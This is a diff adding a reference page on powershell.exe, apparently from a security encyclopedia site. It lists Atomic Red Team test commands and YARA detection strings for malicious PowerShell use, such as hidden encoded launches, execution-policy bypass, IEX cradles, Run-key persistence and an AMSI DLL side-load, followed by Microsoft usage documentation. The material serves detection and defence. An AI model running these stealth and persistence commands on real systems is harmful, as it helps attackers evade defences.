+      <td>On Windows, there are a variety of features in scripting languages in Windows, such as <a href="https://attack.mitre.org/techniques/T1059/001">PowerShell</a>, Jscript, and <a href="https://attack.mitre.org/techniques/T1059/005">Visual Basic</a> to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>. (Citation: PowerShell About 2019)</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.003/T1564.003.md">T1564.003.md</a></td>
+      <td>| powershell_command | Command to launch calc.exe from a hidden PowerShell Window | String | powershell.exe -WindowStyle hidden calc.exe|</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1569.002/T1569.002.md">T1569.002.md</a></td>
+      <td>Upon successful execution, cmd.exe create a new service using sc.exe create that will start powershell.exe to create a new file <code class="language-plaintext highlighter-rouge">art-marker.txt</code></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1569.002/T1569.002.md">T1569.002.md</a></td>
+      <td>| executable_command | Command to execute as a service | string | %COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt|</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/T1574.001.md">T1574.001.md</a></td>
+      <td>Upon successful execution, powershell.exe will be copied and renamed to updater.exe and load amsi.dll from a non-standard path.</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/T1574.001.md">T1574.001.md</a></td>
+      <td>copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_apt34.yar">apt_apt34.yar</a></td>
+      <td>$x3 = “powershell.exe -exec bypass -enc " + ${global:$http_ag} +” wide</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_fin7.yar">apt_fin7.yar</a></td>
+      <td>$x3 = “\par \tab \tab \tab sh.Run "powershell.exe -NoE -NoP -NonI -ExecutionPolicy Bypass -w Hidden -File " &amp; pToPSCb, 0, False” fullword ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_greenbug.yar">apt_greenbug.yar</a></td>
+      <td>$s1 = “powershell.exe -nologo -windowstyle hidden -c "Set-ExecutionPolicy -scope currentuser” fullword ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_greenbug.yar">apt_greenbug.yar</a></td>
+      <td>$s2 = “powershell.exe -c "Set-ExecutionPolicy -scope currentuser -ExecutionPolicy unrestricted -f; . "” fullword ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_lazarus_dec17.yar">apt_lazarus_dec17.yar</a></td>
+      <td>$x1 = “$ProID = Start-Process powershell.exe -PassThru -WindowStyle Hidden -ArgumentList” fullword ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_lazarus_dec17.yar">apt_lazarus_dec17.yar</a></td>
+      <td>$x5 = “/tr "powershell.exe -ep bypass -windowstyle hidden -file “ ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_magichound.yar">apt_magichound.yar</a></td>
+      <td>$s1 = “powershell.exe “ fullword ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_middle_east_talosreport.yar">apt_middle_east_talosreport.yar</a></td>
+      <td>$x1 = “objWShell.Run "powershell.exe -ExecutionPolicy Bypass -File ""%appdata%""\sys.ps1", 0 “ fullword ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_molerats_jul17.yar">apt_molerats_jul17.yar</a></td>
+      <td>$x1 = “powershell.exe -nop -c "iex” nocase ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_ncsc_report_04_2018.yar">apt_ncsc_report_04_2018.yar</a></td>
+      <td>$ = “powershell.exe” ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar">apt_oilrig.yar</a></td>
+      <td>$x2 = “wss.Run "powershell.exe " &amp; Chr(34) &amp; "&amp; {waitfor haha /T 2}" &amp; Chr(34), 0” fullword ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar">apt_oilrig.yar</a></td>
+      <td>$x1 = “wss.Run "powershell.exe " &amp; Chr(34) &amp; "&amp; {(Get-Content $env:Public\Libraries\update.vbs) -replace ‘__’,(Get-Random) | Set-C” ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar">apt_oilrig.yar</a></td>
+      <td>$x1 = “Powershell.exe -exec bypass -file ${global:$address1}”</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/apt_wilted_tulip.yar">apt_wilted_tulip.yar</a></td>
+      <td>$x1 = “powershell.exe -nop -w hidden -c if([IntPtr]::Size -eq 4){$b=’powershell.exe’}else{$b=$env:windir+” ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_empire.yar">gen_empire.yar</a></td>
+      <td>$s2 = “$PowershellExe=$env:windir+’\syswow64\WindowsPowerShell\v1.0\powershell.exe’” fullword ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_metasploit_payloads.yar">gen_metasploit_payloads.yar</a></td>
+      <td>$s1 = “powershell.exe -nop -w hidden -e” ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_metasploit_payloads.yar">gen_metasploit_payloads.yar</a></td>
+      <td>$x1 = “%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e” ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_metasploit_payloads.yar">gen_metasploit_payloads.yar</a></td>
+      <td>$s1 = “.ExpandEnvironmentStrings("%PSModulePath%") + "..\powershell.exe") Then” fullword ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_powershell_susp.yar">gen_powershell_susp.yar</a></td>
+      <td>$p1 = “powershell.exe” fullword ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_powershell_susp.yar">gen_powershell_susp.yar</a></td>
+      <td>$s4 = “powershell.exe -w hidden -ep bypass -Enc” ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_powershell_susp.yar">gen_powershell_susp.yar</a></td>
+      <td>$s6 = “powershell.exe reg add HKCU\software\microsoft\windows\currentversion\run” nocase</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_powershell_susp.yar">gen_powershell_susp.yar</a></td>
+      <td>$s1 = “POwErSHELl.ExE” fullword ascii nocase</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_powershell_susp.yar">gen_powershell_susp.yar</a></td>
+      <td>$x1 = “Process.Create("powershell.exe -nop -w hidden” fullword ascii nocase</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_powershell_susp.yar">gen_powershell_susp.yar</a></td>
+      <td>$x2 = “.Run"powershell.exe -nop -w hidden -c ""IEX “ ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_powershell_susp.yar">gen_powershell_susp.yar</a></td>
+      <td>$x1 = “.Run "powershell.exe -nop -w hidden -e “ ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_powershell_susp.yar">gen_powershell_susp.yar</a></td>
+      <td>$x2 = “FileExists(path + "\..\powershell.exe")” fullword ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_ps_empire_eval.yar">gen_ps_empire_eval.yar</a></td>
+      <td>$s2 = “powershell.exe” ascii fullword</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_winpayloads.yar">gen_winpayloads.yar</a></td>
+      <td>$x4 = “powershell.exe -WindowStyle Hidden -enc JABjAGwAaQBlAG4AdAA” ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_win_privesc.yar">gen_win_privesc.yar</a></td>
+      <td>$x1 = “# powershell.exe -executionpolicy bypass -file folderperm.ps1” fullword ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/gen_wmi_implant.yar">gen_wmi_implant.yar</a></td>
+      <td>$x5 = “-Command ‘powershell.exe -command "Enable-PSRemoting” fullword ascii</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/signature-base">signature-base</a></td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/yara/thor-hacktools.yar">thor-hacktools.yar</a></td>
+      <td>$s1 = “[*] Looks like we’re 64bit, using regular powershell.exe” ascii wide</td>
+      <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="additional-info">Additional Info*</h2>
+
+<p><em>*The information below is copied from <a href="https://github.com/MicrosoftDocs/windowsserverdocs">MicrosoftDocs</a>, which is maintained by <a href="https://opensource.microsoft.com/codeofconduct/">Microsoft</a>. Available under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> license.</em></p>
+
+<hr />
+
+<h2 id="powershell">PowerShell</h2>
+
+<p>Windows PowerShell is a task-based command-line shell and scripting language designed especially for system administration. Built on the .NET Framework, Windows PowerShell helps IT professionals and power users control and automate the administration of the Windows operating system and applications that run on Windows.</p>
+
+<h3 id="using-powershellexe">Using PowerShell.exe</h3>
+
+<p>The <strong>PowerShell.exe</strong> command-line tool starts a Windows PowerShell session in a Command Prompt window. When you use <strong>PowerShell.exe</strong>, you can use its optional parameters to customize the session. For example, you can start a session that uses a particular execution policy or one that excludes a Windows PowerShell profile. Otherwise, the session is the same as any session that is started in the Windows PowerShell console.</p>
+
+<ul>
+  <li>
+    <p>To start a Windows PowerShell session in a Command Prompt window, type <code class="language-plaintext highlighter-rouge">PowerShell</code>. A <strong>PS</strong> prefix is added to the command prompt to indicate that you are in a Windows PowerShell session.</p>
+  </li>
+  <li>
+    <p>To start a session with a particular execution policy, use the <strong>ExecutionPolicy</strong> parameter, and type:</p>
+
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">  </span><span class="nf">PowerShell.exe</span><span class="w"> </span><span class="nt">-ExecutionPolicy</span><span class="w"> </span><span class="nx">Restricted</span><span class="w">
+</span></code></pre></div>    </div>
+  </li>
+  <li>
+    <p>To start a Windows PowerShell session without your Windows PowerShell profiles, use the <strong>NoProfile</strong> parameter, and type:</p>
+
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">  </span><span class="nf">PowerShell.exe</span><span class="w"> </span><span class="nt">-NoProfile</span><span class="w">
+</span></code></pre></div>    </div>
+  </li>
+  <li>
+    <p>To start a session , use the <strong>ExecutionPolicy</strong> parameter, and type:</p>
+
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">  </span><span class="nf">PowerShell.exe</span><span class="w"> </span><span class="nt">-ExecutionPolicy</span><span class="w"> </span><span class="nx">Restricted</span><span class="w">
+</span></code></pre></div>    </div>
+  </li>
+  <li>
+    <p>To see the PowerShell.exe help file, type:</p>
+
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">  </span><span class="nf">PowerShell.exe</span><span class="w"> </span><span class="nt">-help</span><span class="w">
+  </span><span class="nf">PowerShell.exe</span><span class="w"> </span><span class="nf">-?</span><span class="w">
+  </span><span class="nx">PowerShell.exe</span><span class="w"> </span><span class="nx">/</span><span class="nf">?</span><span class="w">
+</span></code></pre></div>    </div>
+  </li>
+  <li>
+    <p>To end a Windows PowerShell session in a Command Prompt window, type <code class="language-plaintext highlighter-rouge">exit</code>. The typical command prompt returns.</p>
+  </li>
+</ul>
+
+<h4 id="remarks">Remarks</h4>
+
+<ul>
+  <li>
+    <p>For a complete list of the <strong>PowerShell.exe</strong> command-line parameters, see <a href="/powershell/module/microsoft.powershell.core/about/about_powershell_exe">about_PowerShell.Exe</a>.</p>
+  </li>
+  <li>
+    <p>For information about other ways to start Windows PowerShell, see <a href="/powershell/scripting/windows-powershell/starting-windows-powershell">Starting Windows PowerShell</a>.</p>
+  </li>
+  <li>
+    <p>Windows PowerShell runs on the Server Core installation option of Windows Server operating systems. However, features that require a graphic user interface, such as the <a href="/previous-versions/hh849182(v=technet.10)">Windows PowerShell Integrated Scripting Environment (ISE)</a>, and the <a href="/powershell/module/microsoft.powershell.utility/out-gridview">Out-GridView</a> and <a href="/powershell/module/microsoft.powershell.utility/show-command">Show-Command</a> cmdlets, don’t run on Server Core installations.</p>
+  </li>
+</ul>
+
+<h3 id="additional-references">Additional References</h3>
+
+<ul>
+  <li>
+    <p><a href="/powershell/module/microsoft.powershell.core/about/about_powershell_exe">about_PowerShell.Exe</a></p>
+  </li>
+  <li>
+    <p><a href="/powershell/module/microsoft.powershell.core/about/about_powershell_ise_exe">about_PowerShell_Ise.exe</a></p>
+  </li>
+  <li>
+    <p><a href="/powershell/">Windows PowerShell</a></p>
+  </li>
+</ul>
+
+<hr />
+
+<p>MIT License. Copyright (c) 2020 Strontic.</p>
+
+
+    </section>
+  </article>
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form onsubmit="return googleCustomSearchExecute();" id="cse-search-box-form-id">
+    <label class="sr-only" for="cse-search-input-box-id">
+      Enter your search term...
+    </label>
+    <input type="search" id="cse-search-input-box-id" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results">
+    <gcse:searchresults-only></gcse:searchresults-only>
+  </div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+          <li><a href="https://strontic.com" rel="nofollow noopener noreferrer"><i class="fab fa-blogger" aria-hidden="true"></i> strontic.com</a></li>
+        
+      
+        
+          <li><a href="https://twitter.com/strontic20" rel="nofollow noopener noreferrer"><i class="fab fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+        
+      
+        
+          <li><a href="https://github.com/strontic" rel="nofollow noopener noreferrer"><i class="fab fa-github-square" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+        
+          <li><a href="https://instagram.com/strontic20" rel="nofollow noopener noreferrer"><i class="fab fa-instagram-square" aria-hidden="true"></i> Instagram</a></li>
+        
+      
+        
+          <li><a href="https://www.linkedin.com/company/strontic" rel="nofollow noopener noreferrer"><i class="fab fa-linkedin" aria-hidden="true"></i> LinkedIn</a></li>
+        
+      
+        
+          <li><a href="https://www.facebook.com/strontic" rel="nofollow noopener noreferrer"><i class="fab fa-facebook-square" aria-hidden="true"></i> Facebook</a></li>
+        
+      
+        
+          <li><a href="mailto:info@strontic.com" rel="nofollow noopener noreferrer"><i class="fas fa-envelope-square" aria-hidden="true"></i> Email</a></li>
+        
+      
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2020 STRONTIC. Theme: <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+<script>
+  (function () {
+    var cx = '31f5caf6441fb12c8';
+    var gcse = document.createElement('script');
+    gcse.type = 'text/javascript';
+    gcse.async = true;
+    gcse.src = 'https://cse.google.com/cse.js?cx=' + cx;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(gcse, s);
+  })();
+
+  function googleCustomSearchExecute() {
+    var input = document.getElementById('cse-search-input-box-id');
+    var element = google.search.cse.element.getElement('searchresults-only0');
+    if (input.value == '') {
+      element.clearAllResults();
+    } else {
+      element.execute(input.value);
+    }
+    return false;
+  }
+
+  
+</script>
+
+
+
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-179392403-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-179392403-1', { 'anonymize_ip': true});
+</script>
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
